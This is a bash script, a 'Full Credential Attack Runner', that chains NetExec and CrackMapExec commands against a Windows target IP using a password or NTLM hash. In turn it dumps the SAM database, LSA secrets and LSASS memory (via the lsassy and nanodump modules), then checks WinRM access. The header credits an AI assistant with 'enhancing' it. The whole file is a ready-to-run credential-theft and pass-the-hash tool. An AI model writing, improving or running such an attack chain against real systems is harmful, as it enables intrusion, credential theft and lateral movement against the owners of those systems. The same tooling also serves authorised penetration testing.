#!/bin/bash
# ============================================================
#  💀 Full Credential Attack Runner v3 - ENHANCED
#  CME + NetExec | SAM / LSA / LSASS / Modules
#  Author: @mohnad_style | Enhanced: Claude
# ============================================================

# ============================================================
#  COLORS
# ============================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ============================================================
#  BANNER
# ============================================================
echo -e "${RED}${BOLD}"
echo "   ██████╗██████╗ ███████╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
echo "  ██╔════╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
echo "  ██║     ██████╔╝█████╗  ██║  ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝ "
echo "  ██║     ██╔══██╗██╔══╝  ██║  ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
echo "  ╚██████╗██║  ██║███████╗██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
echo "   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo -e "${RESET}"
echo -e "${DIM}${WHITE}  💀  Full Credential Attack Chain | NXC + CME | @mohnad_style${RESET}"
echo -e "${DIM}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# ============================================================
#  USAGE CHECK
# ============================================================
if [[ $# -lt 3 ]]; then
    echo -e "${RED}[✗] Missing arguments!${RESET}"
    echo ""
    echo -e "${WHITE}${BOLD}  Usage:${RESET}"
    echo -e "    ${CYAN}$0 <IP> <USER> <PASSWORD|NTLM_HASH> [--local-auth]${RESET}"
    echo ""
    echo -e "${WHITE}${BOLD}  Examples:${RESET}"
    echo -e "    ${DIM}# Domain user + password${RESET}"
    echo -e "    ${GREEN}$0 192.168.1.10 Eric.Wallows EricLikesRunning800${RESET}"
    echo ""
    echo -e "    ${DIM}# Domain user + NTLM hash${RESET}"
    echo -e "    ${GREEN}$0 192.168.1.10 o.foller decca5b9babc228de4cedeb29a6b9abf${RESET}"
    echo ""
    echo -e "    ${DIM}# Local admin + NTLM hash${RESET}"
    echo -e "    ${GREEN}$0 192.168.1.10 Administrator 97db5c87465431b9091d47a58fe76483 --local-auth${RESET}"
    echo ""
    exit 1
fi

# ============================================================
#  ARGUMENTS
# ============================================================
IP="$1"
USER="$2"
SECRET="$3"
LOCAL_AUTH="$4"

AUTH_FLAG=""
AUTH_TYPE="-p"
AUTH_LABEL="PASSWORD"

[[ "$SECRET" =~ ^[a-fA-F0-9]{32}$ ]] && AUTH_TYPE="-H" && AUTH_LABEL="NTLM HASH"
[[ "$LOCAL_AUTH" == "--local-auth" ]]  && AUTH_FLAG="--local-auth"

# ============================================================
#  MISSION BRIEFING
# ============================================================
echo -e "${WHITE}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║                    🎯  MISSION BRIEFING                      ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "  ${DIM}Target IP   :${RESET}  ${CYAN}${BOLD}$IP${RESET}"
echo -e "  ${DIM}Username    :${RESET}  ${WHITE}$USER${RESET}"

if [[ "$AUTH_TYPE" == "-H" ]]; then
    echo -e "  ${DIM}Auth Type   :${RESET}  ${MAGENTA}${BOLD}NTLM HASH${RESET} ${DIM}(Pass-the-Hash)${RESET}"
    echo -e "  ${DIM}Hash        :${RESET}  ${YELLOW}$SECRET${RESET}"
else
    echo -e "  ${DIM}Auth Type   :${RESET}  ${GREEN}${BOLD}PASSWORD${RESET}"
    echo -e "  ${DIM}Password    :${RESET}  ${YELLOW}$SECRET${RESET}"
fi

if [[ -n "$AUTH_FLAG" ]]; then
    echo -e "  ${DIM}Local Auth  :${RESET}  ${RED}${BOLD}YES${RESET} ${DIM}(--local-auth)${RESET}"
else
    echo -e "  ${DIM}Local Auth  :${RESET}  ${DIM}NO (domain context)${RESET}"
fi

echo ""
echo -e "  ${DIM}Log Output  :${RESET}  ${DIM}~/.nxc/logs/ | ~/.cme/logs/${RESET}"
echo ""

# ============================================================
#  HELPERS
# ============================================================
STEP=0
PASS_COUNT=0
FAIL_COUNT=0
SKIP_COUNT=0
declare -A RESULTS

run_step() {
    local title="$1"
    local icon="$2"
    local color="$3"
    local cmd=("${@:4}")
    ((STEP++))

    echo -e "${color}${BOLD}"
    echo "  ┌──────────────────────────────────────────────────────────────┐"
    printf "  │  %s  Step %d / 6 │ %-48s │\n" "$icon" "$STEP" "$title"
    echo "  └──────────────────────────────────────────────────────────────┘"
    echo -e "${RESET}"

    echo -e "  ${DIM}[CMD]${RESET} ${WHITE}${cmd[*]}${RESET}"
    echo -e "${DIM}  ────────────────────────────────────────────────────────────────${RESET}"

    # Run command — preserve PTY so NXC/CME show colors, capture to tmpfile for analysis
    local tmpfile
    tmpfile=$(mktemp /tmp/attack_step_XXXXXX)

    if command -v unbuffer &>/dev/null; then
        # unbuffer forces PTY → colors preserved through pipe
        unbuffer "${cmd[@]}" 2>&1 | tee >(sed 's/\x1b\[[0-9;]*m//g' > "$tmpfile")
    else
        # fallback: script -q forces PTY allocation
        script -q -c "${cmd[*]}" /dev/null 2>&1 | tee >(sed 's/\x1b\[[0-9;]*m//g' > "$tmpfile")
    fi

    local plain_output
    plain_output=$(cat "$tmpfile")
    rm -f "$tmpfile"

    echo -e "${DIM}  ────────────────────────────────────────────────────────────────${RESET}"

    # Analyze result from plain (uncolored) copy
    if echo "$plain_output" | grep -qi "\[+\]\|Pwn3d!\|SUCCESS\|STATUS_SUCCESS"; then
        echo -e "  ${GREEN}${BOLD}[✔] SUCCESS${RESET} — $title"
        RESULTS["$title"]="${GREEN}✔ SUCCESS${RESET}"
        ((PASS_COUNT++))
    elif echo "$plain_output" | grep -qi "STATUS_LOGON_FAILURE\|STATUS_ACCESS_DENIED\|\[-\] Login"; then
        echo -e "  ${RED}${BOLD}[✗] FAILED${RESET} — Auth failed for $title"
        RESULTS["$title"]="${RED}✗ AUTH FAILED${RESET}"
        ((FAIL_COUNT++))
    elif echo "$plain_output" | grep -qi "error\|exception\|traceback"; then
        echo -e "  ${YELLOW}[!] ERROR${RESET} — $title encountered an error"
        RESULTS["$title"]="${YELLOW}! ERROR${RESET}"
        ((FAIL_COUNT++))
    else
        echo -e "  ${CYAN}[~] DONE${RESET} — $title completed"
        RESULTS["$title"]="${CYAN}~ DONE${RESET}"
        ((PASS_COUNT++))
    fi

    echo ""
}

# ============================================================
#  ATTACK CHAIN
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BLUE}${BOLD}  ⚔  STARTING ATTACK CHAIN${RESET}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

### 1. SMB Auth Check
run_step "SMB Auth Check" "🔐" "$CYAN" \
    nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG

### 2. Dump SAM
run_step "SAM Database Dump" "🗄" "$YELLOW" \
    crackmapexec smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG --sam

### 3. Dump LSA
run_step "LSA Secrets Dump" "🔑" "$MAGENTA" \
    crackmapexec smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG --lsa

### 4. LSASS via lsassy
run_step "LSASS Dump (lsassy)" "🧠" "$RED" \
    nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M lsassy

### 5. LSASS via nanodump
run_step "LSASS Dump (nanodump)" "💉" "$RED" \
    nxc smb "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG -M nanodump

### 6. WinRM Check
run_step "WinRM Access Check" "💻" "$GREEN" \
    nxc winrm "$IP" -u "$USER" $AUTH_TYPE "$SECRET" $AUTH_FLAG

# ============================================================
#  SUMMARY TABLE
# ============================================================
echo -e "${WHITE}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║                   📊  ATTACK SUMMARY                         ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "  ${DIM}Target:${RESET} ${CYAN}$IP${RESET}   ${DIM}User:${RESET} ${WHITE}$USER${RESET}   ${DIM}Auth:${RESET} ${YELLOW}$AUTH_LABEL${RESET}"
echo ""

steps=(
    "SMB Auth Check"
    "SAM Database Dump"
    "LSA Secrets Dump"
    "LSASS Dump (lsassy)"
    "LSASS Dump (nanodump)"
    "WinRM Access Check"
)
icons=("🔐" "🗄" "🔑" "🧠" "💉" "💻")

for i in "${!steps[@]}"; do
    step="${steps[$i]}"
    icon="${icons[$i]}"
    result="${RESULTS[$step]:-${DIM}? UNKNOWN${RESET}}"
    printf "  %s  %-30s → " "$icon" "$step"
    echo -e "$result"
done

echo ""
echo -e "  ${GREEN}Passed: ${WHITE}${BOLD}$PASS_COUNT${RESET}   ${RED}Failed: ${WHITE}${BOLD}$FAIL_COUNT${RESET}"

# ============================================================
#  LOG HINTS
# ============================================================
echo ""
echo -e "${DIM}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${DIM}  📁 Logs:${RESET}"
echo -e "    ${DIM}~/.nxc/logs/   ~/.cme/logs/   /tmp/*_64_*.log${RESET}"

echo ""
echo -e "${GREEN}${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║  ✅  Attack Chain Complete!              ║"
echo "  ╚══════════════════════════════════════════╝"
echo -e "${RESET}"
